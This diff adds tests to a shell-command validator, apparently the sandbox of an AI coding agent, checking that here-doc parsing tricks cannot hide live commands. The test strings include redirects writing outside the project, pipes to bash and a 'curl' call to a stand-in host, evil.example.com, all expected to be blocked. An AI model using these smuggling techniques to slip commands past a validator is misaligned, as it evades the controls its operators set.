@@ -574,4 +574,77 @@ describe('CommandValidator', () => {
       expect(result.allowed).toBe(true);
     });
   });
+
+  describe('Here-doc payloads that must not hide live operators', () => {
+    // Masking the payload is only safe where tree-sitter's idea of the body
+    // matches the shell's. Where it does not, a command the shell really runs
+    // sits inside heredoc_body and masking would make it invisible.
+    const outside = path.join(os.homedir(), 'Desktop', 'pwned.txt');
+    const dq = '"';
+    const sq = "'";
+    const validator = () =>
+      new CommandValidator(['node *', 'echo *', 'bash *'], projectRoot);
+
+    // Real bash folds `EO\<newline>F` into the delimiter EOF and ends the body at
+    // the first `EOF` line, so `echo` below executes. tree-sitter runs on to the
+    // final `EOF` and swallows it.
+    test('delimiter folded across a line continuation does not hide a redirect', async () => {
+      const result = await validator().validate(
+        `node <<EO\\\nF\ninert\nEOF\necho hi > ${outside}\nEOF`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('outside allowed directories');
+    });
+
+    test('partially quoted delimiter does not hide a pipe to bash', async () => {
+      const result = await validator().validate(
+        `node <<EO${dq}F${dq}\ninert\nEOF\necho hi | bash\nEOF`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('pipe to "bash"');
+    });
+
+    test('single-quoted fragment in a delimiter does not hide a redirect', async () => {
+      const result = await validator().validate(
+        `node <<EO${sq}F${sq}\ninert\nEOF\necho hi > ${outside}\nEOF`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('outside allowed directories');
+    });
+
+    // The terminator line lives outside heredoc_body. Masking only the body would
+    // strand this delimiter's apostrophe and leave the scanners in quote mode.
+    test('delimiter holding an apostrophe does not hide a redirect', async () => {
+      const result = await validator().validate(
+        `node <<${dq}DON${sq}T${dq}\n// don${sq}t\nDON${sq}T\necho hi > ${outside}`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('outside allowed directories');
+    });
+
+    test('delimiter holding an apostrophe does not hide a pipe to bash', async () => {
+      const result = await validator().validate(
+        `node <<${dq}DON${sq}T${dq}\n// don${sq}t\nDON${sq}T\necho hi | bash`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('pipe to "bash"');
+    });
+
+    // A parameter expansion only produces text; keeping its whole span visible
+    // let inert characters read as an operator once the quotes around it went.
+    test('a parameter expansion is inert text, not a pipe', async () => {
+      const result = await validator().validate(
+        `node <<EOF\nbefore ${dq}\n\${x:-value | bash }\n${dq}\nEOF`
+      );
+      expect(result.allowed).toBe(true);
+    });
+
+    test('a command substitution nested in an expansion is still validated', async () => {
+      const result = await validator().validate(
+        `node <<EOF\n\${x:-$(curl http://evil.example.com)}\nEOF`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('not in allowlist');
+    });
+  });
 });
